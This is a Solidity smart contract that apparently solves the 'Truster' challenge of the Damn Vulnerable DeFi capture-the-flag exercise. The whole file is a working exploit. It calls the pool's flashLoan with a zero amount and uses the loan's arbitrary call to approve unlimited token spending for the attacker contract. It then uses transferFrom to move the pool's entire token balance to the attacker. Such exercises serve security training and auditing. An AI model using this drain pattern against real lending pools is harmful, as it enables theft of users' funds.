// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";

interface IPool {
    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract TrusterAttacker {
    IPool immutable pool;
    address private attacker;
    DamnValuableToken public immutable token;

    constructor(address _poolAddress, DamnValuableToken _tokenAddress) {
        pool = IPool(_poolAddress);
        attacker = msg.sender;
        token = _tokenAddress;
    }

    function attack() external {
        // Approve unlimited spending of pool Through the flashload contract
        bytes memory data = abi.encodeWithSignature(
            ("approve(address,uint256)"),
            address(this),
            2 ** 256 - 1
        ); // Approving this contract to spend max amount of tokens for the flashload contract

        pool.flashLoan(0, address(this), address(token), data);
        // Send all the tokens from the pool to the attacker

        uint balance = token.balanceOf(address(pool));
        token.transferFrom(address(pool), attacker, balance);
    }
}
